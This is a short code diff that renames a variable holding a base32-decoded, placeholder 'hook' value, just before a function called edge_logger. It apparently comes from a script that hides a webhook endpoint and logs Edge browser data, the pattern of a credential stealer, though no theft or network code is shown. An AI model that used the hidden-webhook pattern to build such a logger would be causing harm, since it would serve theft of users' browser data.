@@ -9,7 +9,7 @@ import os
 
 key = "ENCODED BASE32 HOOK HEREEEE"
 
-weblook = base64.b32decode(key)
+webhook = base64.b32decode(key)
 
 def edge_logger():
     try:
